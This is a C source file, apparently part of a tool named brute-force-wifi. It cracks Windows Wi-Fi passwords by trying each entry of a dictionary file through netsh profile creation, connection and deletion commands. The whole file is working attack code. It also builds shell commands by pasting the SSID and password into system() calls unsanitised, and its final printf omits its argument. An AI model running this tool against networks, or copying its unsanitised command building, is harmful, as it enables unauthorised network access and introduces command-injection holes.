#include "brute-force-wifi.h"

void connectWifi(char *ssidName, char *password)
{
	//format xml name
	char xmlName[300];
	sprintf(xmlName, "Wi-Fi-%s.xml", ssidName);	
	
	//create xml file
	writeXML(xmlName, ssidName, password);
	
	//connect
	char command[1000];

	strcpy(command, "netsh wlan add profile filename = \"");
	strcat(command, xmlName);
	strcat(command,"\" > temp.txt");
	
	system(command);
	
	strcpy(command, "netsh wlan connect name = \"");
	strcat(command, ssidName);
	strcat(command, "\" > temp.txt");

	system(command);
	remove("temp.txt");

	sleep(30); //make sure wifi has been connected
}

short isConnected(void)
{
	system("netsh wlan show interfaces > interfaces.txt");

	FILE *wifiInterfaces = fopen("interfaces.txt","r");

	char infor[1000];

	while(fgets(infor, 1000, wifiInterfaces) != NULL) 
	{
		if(strstr(infor, "State") != NULL)
		{
			fclose(wifiInterfaces);
			remove("interfaces.txt");
			
			char name[10], state[20];
			char split;

			sscanf(infor, "%s %c %s", name, &split, state);

			if(strcmp(state, "connected") == 0)
				return 1; //true
			else 
				return 0; //false

			break;

		}
	}

	fclose(wifiInterfaces);
	remove("interfaces.txt");
	return 0; //false 
}

void bruteForce(char *ssidName, char * dictPath)
{
	char password[200];
	short truePassword = 0; //false

	FILE * dict = fopen(dictPath, "r");

	while((fgets(password, 200, dict)) != NULL)
	{
		printf("CHECKING : %s\n", password);

		connectWifi(ssidName, password);
		

		truePassword = isConnected();

		if(truePassword)
		{
			printf("Connect successfully!\n");
			break;
		}

		printf("Connect unsuccessufully\n");
		//disconnect current wifi
		system("netsh wlan disconnect");
		
		char command[1000];
		
		strcpy(command, "netsh wlan delete profile name = \"");
		strcat(command, ssidName);
		strcat(command, "\" > temp.txt");

		system(command);
		remove("temp.txt");

	}

	if(truePassword)
		printf("Password has been found! It\'s %s\nWe also connect this wifi!", password);
	else
		printf("This %s doesn\'t have matched password!");



	fclose(dict);
}
